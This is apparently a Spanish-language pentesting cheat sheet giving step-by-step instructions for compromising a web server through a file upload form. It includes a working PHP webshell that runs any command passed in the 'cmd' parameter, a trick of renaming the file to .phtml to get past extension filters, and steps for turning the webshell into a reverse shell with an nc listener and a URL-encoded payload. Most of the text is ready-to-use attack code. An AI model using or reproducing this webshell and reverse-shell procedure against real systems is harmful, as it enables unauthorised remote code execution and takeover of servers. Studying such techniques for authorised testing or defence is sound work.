# 1.Encontrar un lugar que permita subir archivos
# 2.Encontrar la ruta en la que se suben los archivos

# 3.Crear un archivo con una Webshell
```bash
nano webshell.php
```

```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

# 4.Subir la Webshell
## Bypass Extension Restriction

Cuando el servidor web no permita subir archivos php, utilizaremos un archivo con extension phtml.

```bash
mv webshell.php webshell.phtml
```

# 5.Abrir la URL del archivo con el comando como parámetro
```HTTP
<"URL Archivo">?cmd=<"Comando a ejecutar">
```

## Obtener una reverse shell desde la web shell
### 1. Ponemos la maquina a la escucha
 ```bash
nc -nlvp <"Puerto a la escucha">
```
### 2. Abrimos la URL del archivo con la reverse shell unicodeada
Para crear el comando de la reverse shell podemos usar https://www.revshells.com/
```HTTP
<"URL Archivo">?cmd=<"Reverse Shell Unicodeada">
```